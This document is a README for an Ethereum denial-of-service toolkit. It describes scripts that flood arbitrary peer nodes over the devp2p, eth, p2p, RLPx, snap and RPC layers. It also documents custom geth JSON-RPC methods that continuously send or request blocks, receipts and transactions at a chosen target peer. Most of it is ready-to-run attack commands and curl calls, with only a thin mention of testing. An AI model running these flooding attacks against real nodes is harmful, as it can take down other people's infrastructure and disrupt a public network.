# Ethereum message-flooding DoS attack against arbitrary nodes in the P2P network

There are two ways to start the message-flooding DoS attack:

1. **eth_dos.sh** - Start the Ethereum protocol DoS attacks via JSON-RPC API
2. **run_dos.sh** - Start protocol-level DoS attacks across multiple layers

## Command-Line DoS Script (run_dos.sh)

The `run_dos.sh` script provides comprehensive DoS attack capabilities across multiple Ethereum protocol layers. This is a direct protocol attack tool that bypasses RPC and communicates directly with target nodes.

### Prerequisites

Make the script executable:
```bash
chmod +x run_dos.sh
```

### Usage

```bash
./run_dos.sh <protocol> <attack_type> <target> [additional_args]
```

### Available Message-flooding DoS Attacks

#### 1. DevP2P Attacks

DevP2P attacks target the discovery protocols:

```bash
# Ping flooding attack
./run_dos.sh devp2p ping enode://1234...@127.0.0.1:30303

# Findnode flooding attack
./run_dos.sh devp2p findnode enode://1234...@127.0.0.1:30303

# Talk request flooding attack
./run_dos.sh devp2p talk enode://1234...@127.0.0.1:30303

# Legacy v4 protocol flooding attacks
./run_dos.sh devp2p pingv4 enode://1234...@127.0.0.1:30303
./run_dos.sh devp2p findnodev4 enode://1234...@127.0.0.1:30303
./run_dos.sh devp2p enrrequestv4 enode://1234...@127.0.0.1:30303
```

#### 2. ETH Protocol Attacks

ETH protocol attacks target the main ethereum wire protocols:

```bash
# Status message flooding
./run_dos.sh eth status enode://1234...@127.0.0.1:30303

# Block hash announcement flooding
./run_dos.sh eth newblockhashes enode://1234...@127.0.0.1:30303

# Transaction message flooding
./run_dos.sh eth transactions enode://1234...@127.0.0.1:30303

# Block header request flooding
./run_dos.sh eth getblockheaders enode://1234...@127.0.0.1:30303

# Block body request flooding
./run_dos.sh eth getblockbodies enode://1234...@127.0.0.1:30303

# New block message flooding
./run_dos.sh eth newblock enode://1234...@127.0.0.1:30303

# Transaction hash announcement flooding
./run_dos.sh eth newpooledtxhashes enode://1234...@127.0.0.1:30303

# Pooled transaction request flooding
./run_dos.sh eth getpooledtxs enode://1234...@127.0.0.1:30303

# Receipt request flooding
./run_dos.sh eth getreceipts enode://1234...@127.0.0.1:30303

# Protocol handshake flooding
./run_dos.sh eth handshakeflood enode://1234...@127.0.0.1:30303
```

#### 3. P2P Protocol Attacks

Basic P2P layer attacks:

```bash
# Ping flooding
./run_dos.sh p2p pingflood enode://1234...@127.0.0.1:30303

# Pong flooding
./run_dos.sh p2p pongflood enode://1234...@127.0.0.1:30303

# Alternating ping/pong flooding
./run_dos.sh p2p pingpongflood enode://1234...@127.0.0.1:30303
```

#### 4. RLPx Layer Attacks

Low-level connection flooding attacks (note: use IP and port separately):

```bash
# RLPx handshake flood
./run_dos.sh rlpx handshakeflood 127.0.0.1 30303

# Connection churn attack
./run_dos.sh rlpx churn 192.168.1.100 30303
```

#### 5. Snap Protocol Attacks

Snap sync protocol flooding attacks:

```bash
# Account range request flooding
./run_dos.sh snap getaccountrange enode://1234...@127.0.0.1:30303

# Storage range request flooding
./run_dos.sh snap getstorageranges enode://1234...@127.0.0.1:30303

# Bytecode request flooding
./run_dos.sh snap getbytecodes enode://1234...@127.0.0.1:30303

# Trie node request flooding
./run_dos.sh snap gettrienodes enode://1234...@127.0.0.1:30303
```

#### 6. RPC Endpoint Attacks

HTTP RPC endpoint attacks:

```bash
# HTTP flood with a specific method
./run_dos.sh rpc httpflood http://127.0.0.1:8545 eth_getBalance

# Malformed JSON-RPC requests
./run_dos.sh rpc malformed http://127.0.0.1:8545
```

### Getting Help

```bash
# Show detailed usage information
./run_dos.sh help
./run_dos.sh --help
./run_dos.sh -h
```

### Important Notes for run_dos.sh

- **Target Format**: Use full enode URLs for most attacks (e.g., `enode://1234...@127.0.0.1:30303`)
- **RLPx Attacks**: Use IP and port separately (not enode format)
- **RPC httpflood**: Requires method parameter as fourth argument
- **Attack Duration**: All attacks run indefinitely until stopped with Ctrl+C
- **Resource Impact**: Monitor system resources during testing

## RPC-Based DoS APIs (eth_dos.sh)

Starting Nodes
Before using the APIs, you need to start one or more Ethereum nodes using the startNode.sh script.

Make the script executable:

chmod +x startNode.sh
Start a node by providing a node name:

./startNode.sh node1
The script will automatically:

Calculate the appropriate ports based on the node number
Set up the data directory
Configure HTTP-RPC, WebSocket, and Auth-RPC endpoints
Enable necessary APIs (web3, eth, net, txpool, engine, admin)
Set verbosity level to 5 for detailed logging
Port configuration:

HTTP-RPC port: 9545 + 1000 * (node_num - 1)
WebSocket port: 9546 + 1000 * (node_num - 1)
Auth-RPC port: 9551 + 1000 * (node_num - 1)
P2P port: 10001 + node_num - 1
Data directory structure:

Node data: ${BASE_PATH}/ddos${node_num}/ethereum/data
JWT secret: ${BASE_PATH}/ddos${node_num}/jwt.hex
Example for starting multiple nodes:

# Start the first node
./startNode.sh node1

# Start the second node
./startNode.sh node2

# Start the third node
./startNode.sh node3
Configuration
Before using the APIs, you need to configure your environment:

Set up your local geth node with RPC enabled
Configure the following variables in dos.sh:
RPC_URL="http://localhost:10545"  # Your geth node's RPC endpoint
PEER_ID="8fdaa258d434f6e9f1cfed5e6169931f86eade403aa42d6f6f47862041143ab5"  # Target peer ID
PRIVATE_KEY=""  # Private key 
Using the Shell Script
The dos.sh script provides a convenient way to call all DoS APIs.

Make the script executable:

chmod +x dos.sh
Run commands using:

./dos.sh <command>
Available commands:

./dos.sh help  # Show all available commands
API Endpoints
All APIs follow the standard JSON-RPC 2.0 format. Here are the available endpoints and their usage:

1. Send Block Headers DoS
Continuously send block headers to a specified peer.

./dos.sh sendBlockHeadersDos
Equivalent curl command:

curl -X POST -H "Content-Type: application/json" --data '{
"jsonrpc":"2.0",
"method":"eth_sendBlockHeadersDos",
"params":["PEER_ID"],
"id":1
}' http://localhost:10545
2. Send Block Bodies DoS
Continuously send block bodies to a specified peer.

./dos.sh sendBlockBodiesDos
3. Send Receipts DoS
Continuously send receipts to a specified peer.

./dos.sh sendReceiptsDos
4. Send New Block Hashes DoS
Continuously sends a new block hash to a specified peer.

./dos.sh sendNewBlockHashesDos
5. Send New Block DoS
Continuously send new blocks to a specified peer.

./dos.sh sendNewBlockDos
6. Send Status Packet DoS
Sends a status packet to a specified peer.

./dos.sh sendStatusPacketDos
7. Send Pooled Transactions DoS
Continuously send pooled transactions to a specified peer.

./dos.sh sendPooledTxsDos
8. Send New Pooled Transaction Hashes DoS
Continuously send new pooled transaction hashes to a specified peer.

./dos.sh sendNewPooledTransactionHashesDos
Equivalent curl command:

curl -X POST -H "Content-Type: application/json" --data '{
"jsonrpc":"2.0",
"method":"eth_sendNewPooledTransactionHashesDos",
"params":["PEER_ID", "PRIVATE_KEY"],
"id":1
}' http://localhost:10545
9. Send Transactions DoS
Continuously send transactions to a specified peer.

./dos.sh sendTransactionsDos
10. Request Block Headers DoS
Continuously requests block headers from a specified peer.

./dos.sh requestBlockHeaderDoS
11. Request Receipts DoS
Continuously requests receipts from a specified peer using random hashes from hashes.txt.

./dos.sh requestReceiptsDos
12. Request Block Bodies DoS
Continuously requests block bodies from a specified peer using random hashes from hashes.txt.

./dos.sh requestBodiesDos
13. Request Pooled Transactions DoS
Continuously requests pooled transactions from a specified peer using random hashes from hashes.txt.

./dos.sh requestPooledTransactionsDos
14. Submit Future Transactions
Submits future transactions to a specified peer.

./dos.sh submitFutureTxs
Equivalent curl command:

curl -X POST -H "Content-Type: application/json" --data '{
"jsonrpc":"2.0",
"method":"eth_submitFutureTxs",
"params":["PEER_ID", "PRIVATE_KEY"],
"id":1
}' http://localhost:10545
Important Notes
Peer ID: Replace PEER_ID with the actual peer ID you want to target
RPC URL: Replace http://localhost:10545 with your actual geth node's RPC endpoint
Private Key: Required for certain operations like sendNewPooledTransactionHashesDos and submitFutureTxs
Hashes.txt: Required for APIs that use random hashes from this file
Example Usage
Here's a complete example of how to use the Send Receipts DoS API:

# Replace with your target peer ID
PEER_ID="8fdaa258d434f6e9f1cfed5e6169931f86eade403aa42d6f6f47862041143ab5"

# Replace with your geth node's RPC endpoint
RPC_URL="http://localhost:10545"

# Using the shell script
./dos.sh sendReceiptsDos

# Or using curl directly
curl -X POST -H "Content-Type: application/json" --data '{
"jsonrpc":"2.0",
"method":"eth_sendReceiptsDos",
"params":["'$PEER_ID'"],
"id":1
}' $RPC_URL
Attack Patterns
Single Attack Node

Continuous attack is possible; testing duration: 2 hours.

Double Attack Node After modification, One of the nodes can continue the attack, while the other node stops immediately.

